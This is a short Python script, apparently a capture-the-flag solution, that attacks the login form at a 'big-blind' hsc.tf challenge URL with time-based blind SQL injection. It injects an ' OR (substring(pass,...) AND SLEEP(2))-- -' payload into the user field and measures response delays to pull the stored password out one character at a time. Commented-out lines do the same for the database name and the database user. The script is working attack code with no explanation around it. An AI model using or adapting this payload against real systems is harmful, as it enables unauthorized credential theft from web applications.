import requests
import time
from string import ascii_letters, ascii_lowercase, digits, punctuation
alphabet = ascii_letters + digits+ punctuation
url ="https://big-blind.hsc.tf/"
user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36" 
content = "application/x-www-form-urlencoded" 
header = {
        "User-Agent":user_agent,
        "Content-Type": content
}
value = ''
for i in range(100):
    for chr in alphabet:
#        statement =f"SELECT substr(database(),1,{len(value)+1})='{value + chr}'"
        statement =f"substring(pass,1,{len(value) + 1})='{value + chr}'"
#        statement =f"SELECT substr(user(),1,{len(value)+1})='{value + chr}'"
        user = f"' OR ({statement} AND SLEEP(2))-- -" # True = 2 sec false = .2 sec
        print(user)

        params = {
                "user": user,
                "pass": "password"

        }
        start_time = time.time()
        r =requests.post(url, headers = header , data = params)
        end_time = time.time()
        delta = end_time - start_time
#        print(delta)
#        print(r.status_code)
        if delta > 2:
            value += chr
            break


